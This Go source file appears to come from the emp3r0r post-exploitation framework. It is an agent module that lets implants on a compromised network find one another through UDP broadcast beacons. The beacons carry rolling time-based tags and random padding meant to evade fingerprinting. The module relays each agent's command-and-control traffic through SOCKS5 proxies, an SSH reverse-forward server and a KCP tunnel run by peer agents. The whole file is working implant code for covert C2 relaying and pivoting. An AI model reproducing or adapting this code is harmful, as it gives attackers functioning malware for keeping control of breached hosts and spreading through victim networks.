package modules

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"log"
	"net"
	"net/url"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ReverseConns record ssh reverse proxy sessions
var (
	ReverseConns      = make(map[string]context.CancelFunc)
	ReverseConnsMutex = &sync.Mutex{}
)

// getRollingTag generates a time-based token (TOTP style)
// It creates a unique 4-byte signature for the given time slot.
func getRollingTag(timeSlot int64) []byte {
	// 1. Convert time slot to bytes
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, timeSlot)

	// 2. Hash the Shared Secret + Time Slot
	// We use the MagicString as the secret key
	key := []byte(def.MagicString)
	input := append(key, buf.Bytes()...)

	// 3. Calculate Checksum (CRC32 is fine here as it's now dynamic)
	checksum := crc32.ChecksumIEEE(input)

	// 4. Return as bytes
	out := new(bytes.Buffer)
	binary.Write(out, binary.LittleEndian, checksum)
	return out.Bytes()
}

// BroadcastServer listen on a UDP port for broadcasts
// wait for some other agents to announce their internet proxy
func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string) (err error) {
	var passProxyCnt int // one time only

	defer cancel()
	bindaddr := ":" + port
	if port == "" {
		bindaddr = ":" + common.RuntimeConfig.ProxyChainBroadcastPort
	}
	pc, err := net.ListenPacket("udp4", bindaddr)
	if err != nil {
		return
	}
	defer pc.Close()
	log.Println("BroadcastServer started")

	buf := make([]byte, 1024)

	// reverseProxy listener
	// ssh reverse proxy
	go func() {
		err = transport.SSHRemoteFwdServer(common.RuntimeConfig.Bring2CCReverseProxyPort,
			common.RuntimeConfig.Password,
			common.RuntimeConfig.SSHHostKey)
		if err != nil {
			log.Printf("SSHProxyServer: %v", err)
		}
	}()

	// kcp server that forwards to ssh reverse proxy
	go func() {
		ctx, cancel := context.WithCancel(context.Background())
		err = transport.KCPTunServer(
			fmt.Sprintf("127.0.0.1:%s", common.RuntimeConfig.Bring2CCReverseProxyPort), // forward to ssh reverse proxy
			common.RuntimeConfig.KCPServerPort,
			common.RuntimeConfig.Password,
			def.MagicString,
			ctx, cancel)
		if err != nil {
			log.Printf("KCP tunnel for reverse proxy: %v", err)
		}
	}()

	// monitor until it works
	go func() {
		// does the proxy work?
		rproxy := fmt.Sprintf("socks5://%s:%s@127.0.0.1:%s",
			common.RuntimeConfig.ShadowsocksLocalSocksPort, // user name of socks5 proxy
			common.RuntimeConfig.Password,                  // password of socks5 proxy

			// To make this work, we forward the socks5 proxy from another agent to us
			common.RuntimeConfig.AgentSocksServerPort) // port of socks5 proxy

		// wait for the proxy to work
		for {
			if common.RuntimeConfig.C2TransportProxy != "" {
				if transport.IsProxyOK(common.RuntimeConfig.C2TransportProxy, def.CCAddress) {
					log.Printf("BroadcastServer reverse proxy checker: proxy '%s' is already working", common.RuntimeConfig.C2TransportProxy)
					util.TakeASnap()
					continue
				}
			}
			if transport.IsProxyOK(rproxy, def.CCAddress) {
				break
			}
			util.TakeASnap()
		}
		common.RuntimeConfig.C2TransportProxy = rproxy
		log.Printf("[+] Reverse proxy configured to %s", rproxy)

		// pass the proxy to others
		if common.RuntimeConfig.C2TransportProxy == rproxy {
			go passProxy(ctx, cancel, &passProxyCnt)
		}
	}()

	// keep listening for broadcasts
	for ctx.Err() == nil {
		n, addr, err := pc.ReadFrom(buf)
		if err != nil || n == 0 {
			log.Printf("BroadcastServer has read nothing: %v", err)
			continue
		}

		// Filter 1: Check length (ignore tiny runt packets < 32 bytes)
		if n < 32 {
			continue
		}

		// Calculate Time Slots (30 second intervals)
		now := time.Now().Unix()
		currentSlot := now / 30
		prevSlot := currentSlot - 1 // Allow 30s drift
		nextSlot := currentSlot + 1 // Allow 30s ahead

		// Generate valid tags for Now and (Now - 30s)
		validTagCurrent := getRollingTag(currentSlot)
		validTagPrev := getRollingTag(prevSlot)
		validTagNext := getRollingTag(nextSlot)

		// Validate: Does the packet header match either valid tag?
		payload := buf[:4]
		if !bytes.Equal(payload, validTagCurrent) && !bytes.Equal(payload, validTagPrev) && !bytes.Equal(payload, validTagNext) {
			log.Printf("BroadcastServer: dropped packet from %s due to invalid tag", addr)
			continue // Invalid or expired tag
		}

		// Extract Source IP
		udpAddr, ok := addr.(*net.UDPAddr)
		if !ok {
			continue
		}
		srcIP := udpAddr.IP.String()

		// Filter 2: Ignore localhost
		if srcIP == "127.0.0.1" || srcIP == "::1" {
			continue
		}

		log.Printf("BroadcastServer: received beacon from %s", srcIP)

		if common.RuntimeConfig.C2TransportProxy != "" &&
			transport.IsProxyOK(common.RuntimeConfig.C2TransportProxy, def.CCAddress) {
			log.Printf("BroadcastServer: proxy %s already set and working fine\n", common.RuntimeConfig.C2TransportProxy)
			continue
		}

		// Reconstruct SOCKS5 URL
		proxy_url := fmt.Sprintf("socks5://%s:%s@%s:%s",
			common.RuntimeConfig.ShadowsocksLocalSocksPort,
			common.RuntimeConfig.Password,
			srcIP,
			common.RuntimeConfig.AgentSocksServerPort)

		// Check deduplication
		if common.RuntimeConfig.C2TransportProxy == proxy_url {
			continue
		}

		// test proxy
		is_proxy_ok := transport.IsProxyOK(proxy_url, def.CCAddress)

		if is_proxy_ok {
			common.RuntimeConfig.C2TransportProxy = proxy_url
			log.Printf("[+] Thank you! Proxy '%s' usable!", proxy_url)
			log.Printf("BroadcastServer: %s set as common.RuntimeConfig.AgentProxy\n", common.RuntimeConfig.C2TransportProxy)

			// pass the proxy to others
			go passProxy(ctx, cancel, &passProxyCnt)

		} else {
			log.Printf("[-] Oh crap! %s doen't work, we have to wait for a usable proxy", proxy_url)
		}
	}
	return
}

// passProxy let other agents on our network use our common.RuntimeConfig.AgentProxy
func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
	// one time only
	*count++
	if *count > 1 {
		log.Printf("passProxy count %d, aborting", *count)
		return
	}

	proxyAddr := common.RuntimeConfig.C2TransportProxy
	parsed_url, err := url.Parse(proxyAddr)
	if err != nil {
		log.Printf("TCPFwd: invalid proxy addr: %s", proxyAddr)
		return
	}
	go func() {
		if parsed_url.Hostname() == "127.0.0.1" {
			log.Printf("common.RuntimeConfig.AgentProxy is %s, we are already serving the proxy, let's start broadcasting right away", proxyAddr)
			return
		}
		log.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", proxyAddr)
		err := transport.TCPFwd(parsed_url.Host, common.RuntimeConfig.AgentSocksServerPort, ctx, cancel)
		if err != nil {
			log.Print("TCPFwd: ", err)
		}
	}()
	go StartBroadcast(false, ctx, cancel)
}

func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.CancelFunc) {
	// disable broadcasting when interval is 0
	if common.RuntimeConfig.ProxyChainBroadcastIntervalMax == 0 {
		log.Println("Broadcasting is turned off, aborting")
		return
	}

	if start_socks5 {
		// start a socks5 proxy
		err := Socks5Proxy("on", "0.0.0.0:"+common.RuntimeConfig.AgentSocksServerPort)
		if err != nil {
			log.Printf("Socks5Proxy on: %v", err)
			return
		}
		defer func() {
			err := Socks5Proxy("off", "0.0.0.0:"+common.RuntimeConfig.AgentSocksServerPort)
			if err != nil {
				log.Printf("Socks5Proxy off: %v", err)
			}
		}()
	}

	defer func() {
		log.Print("Broadcasting stopped")
		cancel()
	}()

	for ctx.Err() == nil {
		log.Print("Broadcasting our proxy...")
		time.Sleep(time.Duration(util.RandInt(common.RuntimeConfig.ProxyChainBroadcastIntervalMin, common.RuntimeConfig.ProxyChainBroadcastIntervalMax)) * time.Second)

		// [IMPORTANT] Generate the tag FRESH for this moment
		timeSlot := time.Now().Unix() / 30
		magicTag := getRollingTag(timeSlot)

		// Prepare payload: 4 bytes tag + random noise (28+ bytes)
		// Randomize packet size to avoid fingerprinting (32 to 256 bytes)
		packetSize := util.RandInt(32, 256)
		payload := make([]byte, packetSize)
		copy(payload[:4], magicTag)
		rand.Read(payload[4:])

		ips := netutil.IPaddr()
		for _, netip := range ips {
			broadcastAddr := netutil.IPbroadcastAddr(netip)
			if broadcastAddr == "" {
				continue
			}

			// Send raw UDP packet
			dst := broadcastAddr + ":" + common.RuntimeConfig.ProxyChainBroadcastPort
			addr, err := net.ResolveUDPAddr("udp4", dst)
			if err != nil {
				log.Printf("StartBroadcast resolve %s: %v", dst, err)
				continue
			}

			conn, err := net.ListenPacket("udp4", ":0")
			if err != nil {
				log.Printf("StartBroadcast listen: %v", err)
				continue
			}

			_, err = conn.WriteTo(payload, addr)
			conn.Close()

			if err != nil {
				log.Printf("StartBroadcast send to %s: %v", dst, err)
			} else {
				log.Printf("StartBroadcast: sent beacon to %s", dst)
			}
		}
	}
}
